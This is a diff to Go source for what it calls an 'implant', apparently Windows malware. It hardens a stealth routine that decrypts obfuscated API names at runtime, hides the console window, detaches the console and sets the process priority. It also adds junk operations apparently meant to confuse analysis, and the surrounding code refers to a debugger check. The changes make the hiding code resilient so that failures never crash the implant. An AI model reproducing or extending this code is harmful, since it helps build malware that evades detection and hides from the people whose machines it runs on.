@@ -26,22 +26,30 @@ func platformCheckDebug() bool {
 }
 
 func platformHideTerminal() {
+	defer func() { recover() }() // never let API resolve failures kill the implant
+
 	kernelLibLoad := syscall.NewLazyDLL(shiftDecrypt(kernelLib))
 	userLibLoad := syscall.NewLazyDLL(shiftDecrypt(userLib))
 
 	proc := kernelLibLoad.NewProc(shiftDecrypt(getWindowProc))
+	if err := proc.Find(); err != nil {
+		return
+	}
 	hwnd, _, _ := proc.Call()
 
 	if hwnd != 0 {
 		showProc := userLibLoad.NewProc(shiftDecrypt(showWindowProc))
-		showProc.Call(hwnd, uintptr(hideFlag))
+		if showProc.Find() == nil {
+			showProc.Call(hwnd, uintptr(hideFlag))
+		}
 	}
 
-	proc = kernelLibLoad.NewProc("FreeConsole")
-	proc.Call()
-
-	proc = kernelLibLoad.NewProc("SetPriorityClass")
-	proc.Call(uintptr(os.Getpid()), 0x00004000)
+	if p := kernelLibLoad.NewProc("FreeConsole"); p.Find() == nil {
+		p.Call()
+	}
+	if p := kernelLibLoad.NewProc("SetPriorityClass"); p.Find() == nil {
+		p.Call(uintptr(os.Getpid()), 0x00004000)
+	}
 	_ = time.Now().UnixNano() % 100
 	_ = hashString("hide_junk")
 }
